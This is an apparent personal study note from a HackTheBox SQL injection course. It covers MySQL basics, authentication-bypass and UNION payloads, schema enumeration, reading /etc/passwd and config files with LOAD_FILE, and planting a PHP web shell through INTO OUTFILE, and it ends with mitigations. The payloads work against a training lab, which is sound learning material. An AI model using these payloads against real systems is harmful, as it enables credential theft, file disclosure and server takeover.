#MySQL #cybersecurity #HTB  #CWES 

- [[SQL Injection Fundamentals#Intro to databases]]
- [[SQL Injection Fundamentals#Intro to MySQL]]
- [[SQL Injection Fundamentals#Intro to SQL Injections]]
- [[SQL Injection Fundamentals#Union Injections]]
- [[SQL Injection Fundamentals#Database enumeration]]
- [[SQL Injection Fundamentals#Reading files]]
- [[SQL Injection Fundamentals#Writing files]]
- [[SQL Injection Fundamentals#Mitigating SQL Injection]]
- [[SQL Injection Fundamentals#LAB]]
# What is?
SQL injection refers to attacks against relational databases such as `MySQL` (whereas injections against non-relational databases, such as MongoDB, are NoSQL injection). This module will focus on `MySQL` to introduce SQL Injection concepts.

A SQL injection occurs when a malicious user attempts to pass input that changes the final SQL query sent by the web application to the database, enabling the user to perform other unintended SQL queries directly against the database.
# Intro to databases
There are many different types of databases, each of which fits a particular type of use. Traditionally, an application used file-based databases, which was very slow with the increase in size. This led to the adoption of `Database Management Systems` (`DBMS`).
## Non-relational Databases

A non-relational database (also called a `NoSQL` database) does not use tables, rows, and columns or prime keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models, depending on the type of data stored. Due to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible. Therefore, when dealing with datasets that are not very well defined and structured, a NoSQL database would be the best choice for storing such data. There are four common storage models for NoSQL databases:

- Key-Value
- Document-Based
- Wide-Column
- Graph

The above example can be represented using JSON as:
```json
{
  "100001": {
    "date": "01-01-2021",
    "content": "Welcome to this web application."
  },
  "100002": {
    "date": "02-01-2021",
    "content": "This is the first post on this web app."
  },
  "100003": {
    "date": "02-01-2021",
    "content": "Reminder: Tomorrow is the ..."
  }
}
```

The most common example of a NoSQL database is `MongoDB`.

Non-relational Databases have a different method for injection, known as NoSQL injections. SQL injections are completely different than NoSQL injections. NoSQL injections will be covered in a later module.
# Intro to MySQL
SQL syntax can differ from one RDBMS to another. However, they are all required to follow the [ISO standard](https://en.wikipedia.org/wiki/ISO/IEC_9075) for Structured Query Language. We will be following the MySQL/MariaDB syntax for the examples shown. SQL can be used to perform the following actions:

- Retrieve data
- Update data
- Delete data
- Create new tables and databases
- Add / remove users
- Assign permissions to these users

> [!Important] 
> The `mysql` utility is used to authenticate to and interact with a MySQL/MariaDB database. The `-u` flag is used to supply the username and the `-p` flag for the password. The `-p` flag should be passed empty, so we are prompted to enter the password and do not pass it directly on the command line since it could be stored in cleartext in the bash_history file.
> ```shell
> mysql -u root -p
> ```

We can view which privileges we have using the `SHOW GRANTS`

When we do not specify a host, it will default to the `localhost` server. We can specify a remote host and port using the `-h` and `-P` flags.
```shell
mysql -u root -h docker.hackthebox.eu -P 3306 -p 
```
## Commands

```MYsql
CREATE DATABASE users;
USE users;
SHOW TABLES; 

CREATE TABLE logins (
    id INT,
    username VARCHAR(100),
    password VARCHAR(100),
    date_of_joining DATETIME,
    PRIMARY KEY (id)
    );
```

Databases store data in form of tables.
## INSERT
```sql
INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
INSERT INTO table_name(column2, column3, ...) VALUES (column2_value, column3_value, ...);
INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');
```
## SELECT
```mysql
SELECT * FROM table_name;
SELECT column1, column2 FROM table_name;
```
## DROP
```mysql
DROP TABLE logins;
```
>[!Important]
>The 'DROP' statement will permanently and completely delete the table with no confirmation, so it should be used with caution.
## ALTER
We can use [ALTER](https://dev.mysql.com/doc/refman/8.0/en/alter-table.html) to change the name of any table and any of its fields or to delete or add a new column to an existing table.
```mysql
ALTER TABLE logins ADD newColumn INT;
ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
ALTER TABLE logins MODIFY newerColumn DATE;
ALTER TABLE logins DROP newerColumn;
```
## UPDATE
```sql
UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
--
UPDATE logins SET password = 'change_password' WHERE id > 1;
```
# Query Results
## ORDER BY
We can sort the results of any query using [ORDER BY](https://dev.mysql.com/doc/refman/8.0/en/order-by-optimization.html) and specifying the column to sort by.
By default, the sort is done in ascending order, but we can also sort the results by `ASC` or `DESC`:

```mysql
SELECT * FROM logins ORDER BY password DESC;
SELECT * FROM logins ORDER BY password DESC, id ASC;
```
## LIMIT
In case our query returns a large number of records, we can [LIMIT](https://dev.mysql.com/doc/refman/8.0/en/limit-optimization.html) the results to what we want only, using `LIMIT` and the number of records we want.

```MYSQL
SELECT * FROM logins LIMIT 2;
```
If we wanted to LIMIT results with an offset, we could specify the offset before the LIMIT count
```mysql
SELECT * FROM logins LIMIT 1, 2; -- (1: offset, 2: LIMIT). The records start in 0.
```
## WHERE 
To filter or search for specific data, we can use conditions with the `SELECT` statement using the [WHERE](https://dev.mysql.com/doc/refman/8.0/en/where-optimization.html) clause, to fine-tune the results

```mysql
SELECT * FROM table_name WHERE <condition>;
-- 
SELECT * FROM logins WHERE id > 1; --  selects all records where the value of `id` is greater than `1`
```
## LIKE 
 It enables selecting records by matching a certain pattern. The query below retrieves all records with usernames starting with `admin`:
```mysql
SELECT * FROM logins WHERE username LIKE 'admin%';
```

> [!info] pop info
> The `%` symbol acts as a wildcard and matches all characters after `admin`. It is used to match zero or more characters. Similarly, the `_` symbol is used to match exactly one character.

```mysql
-- EXAMPLE: SEARCHING A THREE CHARACTER USERNAME
SELECT * FROM logins WHERE username like '___';
-- 
+----+----------+----------+---------------------+
| id | username | password | date_of_joining     |
+----+----------+----------+---------------------+
|  3 | tom      | tom123!  | 2020-07-02 15:18:56 |
+----+----------+----------+---------------------+
1 row in set (0.01 sec)
```
## AND, OR, NOT
Sometimes, expressions with a single condition are not enough to satisfy the user's requirement. For that, SQL supports [Logical Operators](https://dev.mysql.com/doc/refman/8.0/en/logical-operators.html) to use multiple conditions at once. The most common logical operators are `AND`, `OR`, and `NOT`.
- The `AND (&&)` operator takes in two conditions and returns `true` or `false` based on their evaluation
- The `OR (||)` operator takes in two expressions as well, and returns `true` when at least one of them evaluates to `true`
- The `NOT (!)` operator simply toggles a `boolean` value 'i.e. `true` is converted to `false` and viceversa

```MYSQL
SELECT 1 = 1 OR 'test' = 'abc';
SELECT NOT 1 = 1;
SELECT * FROM logins WHERE username != 'john';
```
## Multiple Operator Precendence

- Division (`/`), Multiplication (`*`), and Modulus (`%`)
- Addition (`+`) and subtraction (`-`)
- Comparison (`=`, `>`, `<`, `<=`, `>=`, `!=`, `LIKE`)
- NOT (`!`)
- AND (`&&`)
- OR (`||`)
```mysql
SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;
SELECT * FROM logins WHERE username != 'tom' AND id > 1;
select * from logins where username != 'tom' AND id > 3 - 2;
```
## UNION
The [Union](https://dev.mysql.com/doc/refman/8.0/en/union.html) clause is used to combine results from multiple `SELECT` statements. This means that through a `UNION` injection, we will be able to `SELECT` and dump data from all across the DBMS, from multiple tables and databases.
```mysql
SELECT * FROM ports;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| ZZ-21    | Shenzhen  |
+----------+-----------+
3 rows in set (0.00 sec)
-- ---------------------------
mysql> SELECT * FROM ships;

+----------+-----------+
| Ship     | city      |
+----------+-----------+
| Morrison | New York  |
+----------+-----------+
1 rows in set (0.00 sec)
-- ---------------------------
SELECT * FROM ports UNION SELECT * FROM ships;

+----------+-----------+
| code     | city      |
+----------+-----------+
| CN SHA   | Shanghai  |
| SG SIN   | Singapore |
| Morrison | New York  |
| ZZ-21    | Shenzhen  |
+----------+-----------+
4 rows in set (0.00 sec)
```

>[!note] Note: The data types of the selected columns on all positions should be the same.
### Even and uneven columns
- A `UNION` statement can only operate on `SELECT` statements with an equal number of columns.
- We will find out that the original query will usually not have the same number of columns as the SQL query we want to execute, so we will have to work around that. 

For example, suppose we only had one column. In that case, we want to `SELECT`, we can put junk data for the remaining required columns so that the total number of columns we are `UNION`ing with remains the same as the original query.

>[!Tip]
>Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.
## Lab

>[!example] LAB
>1. What is the last name of the employee whose first name starts with "Bar" AND who was hired on 1990-01-01? *user: root, password: password, host 154.57.164.75:30649*
>```shell
>mysql -u root -h 154.57.164.75 -P 30649 -p
>```
>Once authenticated in `mysql`
>```mysql
>SHOW DATABASES;
>USE employees;
>SHOW TABLES;
>SHOW COLUMNS FROM employees;
>SELECT * FROM employees WHERE first_name LIKE "Bar%" AND hire_date = "1990-01-01";
>```
>![[LAB_SQL.png]]
>
>2. In the 'titles' table, what is the number of records WHERE the employee number is greater than 10000 OR their title does NOT contain 'engineer'?
>```mysql
>SELECT * FROM titles LIMIT 1;*
>SELECT COUNT(*) AS number_of_records
 >   -> FROM titles
>    -> WHERE emp_no > 10000 OR title NOT LIKE "engineer";
>```
>![[LAB_SQL2.png]]
# Intro to SQL Injections
## Use of SQL in Web Applications
First, let us see how web applications use databases MySQL, in this case, to store and retrieve data. Once a DBMS is installed and set up on the back-end server and is up and running, the web applications can start utilizing it to store and retrieve data.
For example, within a `PHP` web application, we can connect to our database, and start using the `MySQL` database through `MySQL` syntax, right within `PHP`.
```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```
Then, the query's output will be stored in `$result`, and we can print it to the page or use it in any other way. The below PHP code will print all returned results of the SQL query in new lines:
```php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```
Web applications also usually use user-input when retrieving data. For example, when a user uses the search function to search for other users, their search input is passed to the web application, which uses the input to search within the databases:
```php
$searchInput =  $_POST['findUser'];
$query = "select * from logins where username like '%$searchInput'";
$result = $conn->query($query);
```
## What is an Injection?
Injection occurs when an application misinterprets user input as actual code rather than a string, changing the code flow and executing it. This can occur by escaping user-input bounds by injecting a special character like (`'`), and then writing code to be executed, like JavaScript code or SQL in SQL Injections. Unless the user input is sanitized, it is very likely to execute the injected code and run it.

In typical cases, the `searchInput` would be inputted to complete the query, returning the expected outcome. Any input we type goes into the following SQL query:
```mysql
select * from logins where username like '%$searchInput'
```
So, if we input `admin`, it becomes `'%admin'`. In this case, if we write any SQL code, it would just be considered as a search term. For example, if we input `SHOW DATABASES;`, it would be executed as `'%SHOW DATABASES;'` The web application will search for usernames similar to `SHOW DATABASES;`. However, as there is no sanitization, in this case, we can add a single quote (`'`), which will end the user-input field, and after it, we can write actual SQL code. For example, if we search for `1'; DROP TABLE users;`, the search input would be:
```mysql
 -- We use (') to scape the original query.
'%1'; DROP TABLE users;' 
```
So, the final SQL query executed would be as follows:
```sql
-- Valid in MSSQL and PostgreSQL. In MySQL, it'd throw and error
select * from logins where username like '%1'; DROP TABLE users;' 
```
## Types of SQL Injections
- **In-band:** The output of both the intended and the new query may be printed directly on the front end, and we can directly read it.
	- **Union Based:** we may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there
	- **Error Based:** It is used when we can get the `PHP` or `SQL` errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.
- **Blind:** we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character.
	- **Time Based:** We use SQL conditional statements that delay the page response if the conditional statement returns `true` using the `Sleep()` function.
	- **Boolean based:** if our conditional statement returns `true`.
- **Out-of-band:** we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there.
## Discovery
Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves.

| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |
# Example
We have a `login panel`.
We can log in with the administrator credentials `admin / p@ssw0rd`.
![[SQLi_admin.png]]
## OR Injection

We would need the query always to return `true`, regardless of the username and password entered, to bypass the authentication. To do this, we can abuse the `OR` operator in our SQL injection.
```mysql
admin' or '1'='1
```
The final query should be as follow:
```sql
SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
```
This means the following:

- If username is `admin`  
    `OR`
- If `1=1` return `true` 'which always returns `true`'  
    `AND`
- If password is `something`
## Comments

Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query. We can use two types of line comments with MySQL `--` and `#`, in addition to an in-line comment `/**/` (although this is not typically used in basic sql injections).
```MYSQL
SELECT username FROM logins; -- Selects usernames from the logins table 
-- The `#` symbol can be used as well.
SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'
```
### More Injections

```mysql
-- USERNAME INPUT: 
fak' OR 1=1 -- -
'-- FINAL QUERY
SELECT * FROM logins WHERE username='fak' OR 1=1 -- -' AND password = '';

-- USERNAME INPUT:
admin'--
'-- FINAL QUERY
SELECT * FROM logins WHERE username='fak' OR 1=1 -- -' AND password = '';

-- PASSWORD INPUT: 
password' OR '1'='1
-- FINAL QUERY
SELECT * FROM logins WHERE username='ola' AND password = 'algo' OR '1' = '1'; -- TRUE
```
## More realistic SQL injections
In real life passwords are hashed. And sometimes, some statements with operations are in parenthesis with another statement related with the security of the server. 

![[Pasted image 20260217181838.png]]

>[!example] LAB SQLi - Comments
>1. Login as the user with the id 5 to get the flag.
>```mysql
>-- USERMAME INPUT
>aldo' OR id=5)-- 
>-- FINAL QUERY
>SELECT * FROM logins WHERE (username='aldo' OR id = 5)-- ' AND id > 1) AND password = 'b104ab9a0e58c861b9628208b3fecd58';
>```
>
# Union Injections
Another type of SQL injection is injecting entire SQL queries executed along with the original query. This section will demonstrate this by using the MySQL `Union` clause to do `SQL Union Injection`.
### Example
The `products` table has two columns in the above example, so we have to `UNION` with two columns. If we only wanted to get one column 'e.g. `username`', we have to do `username, 2`, such that we have the same number of columns:
```sql
SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
```
If we had more columns in the table of the original query, we have to add more numbers to create the remaining required columns. For example, if the original query used `SELECT` on a table with four columns, our `UNION` injection would be:
```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
```
**FINAL QUERY**:
```mysql
SELECT * from products where product_id UNION SELECT username, 2, 3, 4 from passwords-- '

+-----------+-----------+-----------+-----------+
| product_1 | product_2 | product_3 | product_4 |
+-----------+-----------+-----------+-----------+
|   admin   |    2      |    3      |    4      |
+-----------+-----------+-----------+-----------+
```
## Lab

>[!Example] LAB SQLi UNION
>1. Connect to the above MySQL server with the 'mysql' tool, and find the number of records returned when doing a 'Union' of all records in the 'employees' table and all records in the 'departments' table.
>After authenticating we look for columns information in order to gather the name columns:
>![[Pasted image 20260217194051.png]]
>And then:
>```mysql
>SELECT emp_no, first_name FROM employees UNION  SELECT * FROM departments;
>```
# UNION Injections
The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success.
```sql
cn' UNION select 1,2,3-- -
```
This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query. To test that we can get actual data from the database 'rather than just numbers,' we can use the `@@version` SQL query as a test and place it in the second column instead of the number 2:
```sql
-- It gonne display the version of the DB
cn' UNION select 1,@@version,3,4-- -
```
## Using ORDER BY for knowing number of columns
The first way of detecting the number of columns is through the `ORDER BY` function, which we discussed earlier. We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.
For example, we can start with `order by 1`, sort by the first column, and succeed, as the table must have at least one column. Then we will do `order by 2` and then `order by 3` until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist.
```sql
' order by 1-- -
```
## LAB

>[!Example] LAB SQL UNION
> 1. Use a Union injection to get the result of 'user()'
>We use a simple SQL injection to verify the columns and types of data.
>![[Pasted image 20260217202310.png]]
>Before using the UNION injection, we verify the number of columns returned in the query (not displayed in the HTML DOC)
>```mysql
>-- We tried until the DB threw an error
>CN' ORDER BY 5 -- -
>```
>![[Pasted image 20260217203408.png]]
>So, we can use a `UNION` to get the user() info.
>```mysql
>FAK' UNION SELECT NULL,'XD', user(), NULL -- -
>```
>![[Pasted image 20260217203757.png]]
# Database enumeration
Before enumerating the database, we usually need to identify the type of DBMS we are dealing with. This is because each DBMS has different queries, and knowing what it is will help us know what queries to use.
## MySQL Fingerprinting
As an initial guess, if the webserver we see in HTTP responses is `Apache` or `Nginx`, it is a good guess that the webserver is running on Linux, so the DBMS is likely `MySQL`. The same also applies to Microsoft DBMS if the webserver is `IIS`, so it is likely to be `MSSQL`.

|Payload|When to Use|Expected Output|Wrong Output|
|---|---|---|---|
|`SELECT @@version`|When we have full query output|MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'|In MSSQL it returns MSSQL version. Error with other DBMS.|
|`SELECT POW(1,1)`|When we only have numeric output|`1`|Error with other DBMS|
|`SELECT SLEEP(5)`|Blind/No Output|Delays page response for 5 seconds and returns `0`.|Will not delay response with other DBMS|
## INFORMATION_SCHEMA Database

To pull data from tables using `UNION SELECT`, we need to properly form our `SELECT` queries. To do so, we need the following information:

- List of databases
- List of tables within each database
- List of columns within each table

With the above information, we can form our `SELECT` statement to dump data from any column in any table within any database inside the DBMS. This is where we can utilize the `INFORMATION_SCHEMA` Database.
The [INFORMATION_SCHEMA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-introduction.html) database contains metadata about the databases and tables present on the server. This database plays a crucial role while exploiting SQL injection vulnerabilities. As this is a different database, we cannot call its tables directly with a `SELECT` statement. If we only specify a table's name for a `SELECT` statement, it will look for tables within the same database.

So, to reference a table present in another DB, we can use the dot ‘`.`’ operator. For example, to `SELECT` a table `users` present in a database named `my_database`, we can use:

```sql
SELECT * FROM my_database.users;
```

Similarly, we can look at tables present in the `INFORMATION_SCHEMA` Database.
## SCHEMATA
To start our enumeration, we should find what databases are available on the DBMS. The table [SCHEMATA](https://dev.mysql.com/doc/refman/8.0/en/information-schema-schemata-table.html) in the `INFORMATION_SCHEMA` database contains information about all databases on the server. It is used to obtain database names so we can then query them. The `SCHEMA_NAME` column contains all the database names currently present.

```mysql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```
### Injection example
```sql
cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
```

Let us find out which database the web application is running to retrieve ports data from. We can find the current database with the `SELECT database()` query. We can do this similarly to how we found the DBMS version in the previous section:
```sql
cn' UNION select 1,database(),2,3-- -
```

## TABLES

Before we dump data from the `dev` database, we need to get a list of the tables to query them with a `SELECT` statement. To find all tables within a database, we can use the `TABLES` table in the `INFORMATION_SCHEMA` Database.
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

We see four tables in the dev database, namely `credentials`, `framework`, `pages`, and `posts`. For example, the `credentials` table could contain sensitive information to look into it.
## COLUMNS
To dump the data of the `credentials` table, we first need to find the column names in the table, which can be found in the `COLUMNS` table in the `INFORMATION_SCHEMA` database. The [COLUMNS](https://dev.mysql.com/doc/refman/8.0/en/information-schema-columns-table.html) table contains information about all columns present in all the databases. This helps us find the column names to query a table for. The `COLUMN_NAME`, `TABLE_NAME`, and `TABLE_SCHEMA` columns can be used to achieve this. As we did before, let us try this payload to find the column names in the `credentials` table.
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

The table has two columns named `username` and `password`. We can use this information and dump data from the table.
## Data
Now that we have all the information, we can form our `UNION` query to dump data of the `username` and `password` columns from the `credentials` table in the `dev`database. We can place `username` and `password` in place of columns 2 and 3.
```sql
cn' UNION select 1, username, password, 4 from dev.credentials-- -
```
![[Pasted image 20260217211218.png]]
## LAB

>[!Example] LAB SQLi Database Enumeration
>1. Enumerate the database until retrieving data from credentials
>```sql
>-- I just gonna write the commands in this lab
>OLA' UNION SELECT 1, database(), user(), 4 -- -
>```
>![[Pasted image 20260217210458.png]]
>```sql
>OLA' UNION SELECT 1, SCHEMA_NAME, NULL, 4 FROM  INFORMATION_SCHEMA.SCHEMATA -- -
>```
>![[Pasted image 20260217210244.png]]
>```sql
>OLA' UNION SELECT null, TABLE_NAME, null, null FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = 'dev'-- -
>```
>![[Pasted image 20260217210757.png]]
>```sql
>XD' UNION SELECT NULL, COLUMN_NAME, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name = 'credentials' -- -
>```
>![[Pasted image 20260217211108.png]]
>
>2. What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?
>```sql
>xd' UNION SELECT NULL, COLUMN_NAME, NULL, NULL FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='ilfreight'-- -
>```
>![[Pasted image 20260217215541.png]]
>```sql
>xd' UNION SELECT NULL, username, password, NULL FROM ilfreight.users WHERE username='newuser' -- -
>```
>![[Pasted image 20260217215840.png]]
>
# Reading files
## Privileges

Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation.
For example, in `MySQL`, the DB user must have the `FILE` privilege to load a file's content into a table and then dump data from that table and read files. So, let us start by gathering data about our user privileges within the database to decide whether we will read and/or write files to the back-end server.
### DB User

First, we have to determine which user we are within the database. While we do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If we do have DBA privileges, then it is much more probable that we have file-read privileges. If we do not, then we have to check our privileges to see what we can do. To be able to find our current DB user, we can use any of the following queries:
```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```
Our `UNION` injection payload will be as follows:
```sql
cn' UNION SELECT 1, user(), 3, 4-- -
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
### User Privileges

Now that we know our user, we can start looking for what privileges we have with that user. First of all, we can test if we have super admin privileges with the following query
```sql
SELECT super_priv FROM mysql.user
```
Our `UNION` injection payload will be as follows:
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -
```
If we had many users within the DBMS, we can add `WHERE user="root"` to only show privileges for our current user `root`
```sql
cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -
```
The query returns `Y`, which means `YES`, indicating superuser privileges. We can also dump other privileges we have directly from the schema, with the following query:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -
```
From here, we can add `WHERE grantee="'root'@'localhost'"` to only show our current user `root` privileges. Our payload would be:
```sql
cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```
## LOAD_FILE

Now that we know we have enough privileges to read local system files, let us do that using the `LOAD_FILE()` function. The [LOAD_FILE()](https://mariadb.com/kb/en/load_file/) function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name. The following query is an example of how to read the `/etc/passwd` file.
```sql
SELECT LOAD_FILE('/etc/passwd');
```
OR:
```sql
cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
```

>[!note] Note: We will only be able to read the file if the OS user running MySQL has enough privileges to read it.
## Another Example

We know that the current page is `search.php`. The default Apache webroot is `/var/www/html`. Let us try reading the source code of the file at `/var/www/html/search.php`.

```sql
cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
```

However, the page ends up rendering the HTML code within the browser. The HTML source can be viewed by hitting `[Ctrl + U]`.

>[!Example] LAB SQLI FILEs
>1. We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.
>```sql
>o' UNION SELECT NULL, LOAD_FILE('/var/www/html/search.php'), NULL, NULL -- -
>```
>Once we looked the file imported in the SOURCE CODE (***config.php***), we load that file:
>```sql
>o' UNION SELECT NULL, LOAD_FILE('/var/www/html/config.php'), NULL, NULL -- -
>```
>![[Pasted image 20260217232138.png]]
# Writing files
## Write File Privileges

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server
## secure_file_priv

The [secure_file_priv](https://mariadb.com/kb/en/server-system-variables/#secure_file_priv) variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system.Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory.
Within `MySQL`, we can use the following query to obtain the value of this variable:

```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
However, as we are using a `UNION` injection, we have to get the value using a `SELECT` statement. This shouldn't be a problem, as all variables and most configurations' are stored within the `INFORMATION_SCHEMA` database. `MySQL` global variables are stored in a table called [global_variables](https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html), and as per the documentation, this table has two columns `variable_name` and `variable_value`.
```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```
So, similar to other `UNION` injection queries, we can get the above query result with the following payload. Remember to add two more columns `1` & `4` as junk data to have a total of 4 columns':
```sql
cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
```
## SELECT INTO OUTFILE

Now that we have confirmed that our user should write files to the back-end server, let's try to do that using the `SELECT .. INTO OUTFILE` statement. The [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) statement can be used to write data from select queries into files. This is usually used for exporting data from tables.

To use it, we can add `INTO OUTFILE '...'` after our query to export the results into the file we specified. The below example saves the output of the `users` table into the `/tmp/credentials` file
```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```
If we go to the back-end server and `cat` the file, we see that table's content
```shell
cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
```
It is also possible to directly `SELECT` strings into files, allowing us to write arbitrary files to the back-end server
```sql
SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
```

>[!note] The file that was created successfully is owned by the `mysql` user.

>[!Tip] Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
### Injection
```sql
cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
```
### Web Shell Injection
```sql
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
```
# Lab

>[!Example] LAB SQLi Writing Files
>1. **Find the flag by using a webshell.**
>We use this SQLi
>```sql
>cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
>```
>And we access to the file with the URL:
>```url
>http://154.57.164.75:32300/shell.php?0=ls
>```
>After, looking for the flag, we obtained it
>```url
>http://154.57.164.75:32300/shell.php?0=cat%20../flag.txt
>```
>![[Pasted image 20260220005309.png]]
# Mitigating SQL Injection
We have learned about SQL injections, why they occur, and how we can exploit them. We should also learn how to avoid these types of vulnerabilities in our code and patch them when found.
## Input Sanitization

Here's the snippet of the code from the authentication bypass section we discussed earlier:

```php
<SNIP>
$username = mysqli_real_escape_string($conn, $_POST['username']);
$password = mysqli_real_escape_string($conn, $_POST['password']);

$query = "SELECT * FROM logins WHERE username='". $username. "' AND password = '" . $password . "';" ;
echo "Executing query: " . $query . "<br /><br />";
<SNIP>
```

The [mysqli_real_escape_string()](https://www.php.net/manual/en/mysqli.real-escape-string.php) function escapes characters such as `'` and `"`, so they don't hold any special meaning.
## Input Validation

User input can also be validated based on the data used to query to ensure that it matches the expected input. For example, when taking an email as input, we can validate that the input is in the form of `...@email.com`, and so on
```php
<SNIP>
$pattern = "/^[A-Za-z\s]+$/";
$code = $_GET["port_code"];

if(!preg_match($pattern, $code)) {
  die("</table></div><p style='font-size: 15px;'>Invalid input! Please try again.</p>");
}

$q = "Select * from ports where port_code ilike '%" . $code . "%'";
<SNIP>
```
The code is modified to use the [preg_match()](https://www.php.net/manual/en/function.preg-match.php) function, which checks if the input matches the given pattern or not. The pattern used is `[A-Za-z\s]+`, which will only match strings containing letters and spaces.
## User Privileges

As discussed initially, DBMS software allows the creation of users with fine-grained permissions. We should ensure that the user querying the database only has minimum permissions.

Superusers and users with administrative privileges should never be used with web applications. These accounts have access to functions and features, which could lead to server compromise.
```sql
CREATE USER 'reader'@'localhost';
GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
```
The commands above add a new MariaDB user named `reader` who is granted only `SELECT` privileges on the `ports` table. We can verify the permissions for this user by logging in:
```shell
mysql -u reader -p
```
## Web Application Firewall

Web Application Firewalls (WAF) are used to detect malicious input and reject any HTTP requests containing them. This helps in preventing SQL Injection even when the application logic is flawed. WAFs can be open-source (ModSecurity) or premium (Cloudflare). Most of them have default rules configured based on common web attacks. For example, any request containing the string `INFORMATION_SCHEMA` would be rejected, as it's commonly used while exploiting SQL injection.
```php
<SNIP>
  $username = $_POST['username'];
  $password = $_POST['password'];

  $query = "SELECT * FROM logins WHERE username=? AND password = ?" ;
  $stmt = mysqli_prepare($conn, $query);
  mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
  mysqli_stmt_execute($stmt);
  $result = mysqli_stmt_get_result($stmt);

  $row = mysqli_fetch_array($result);
  mysqli_stmt_close($stmt);
<SNIP>
```
# LAB

>[!Example] LAB SQLi Fundamentals
># Scenario
You have been contracted by chattr GmbH to conduct a penetration test of their web application. In light of a recent breach of one of their main competitors, they are particularly concerned with SQL injection vulnerabilities and the damage the discovery and successful exploitation of this attack could do to their public image and bottom line.
>They provided a target IP address and no further information about their website. **Perform an assessment specifically focused on testing for SQL injection vulnerabilities on the web application from a "black box" approach.***
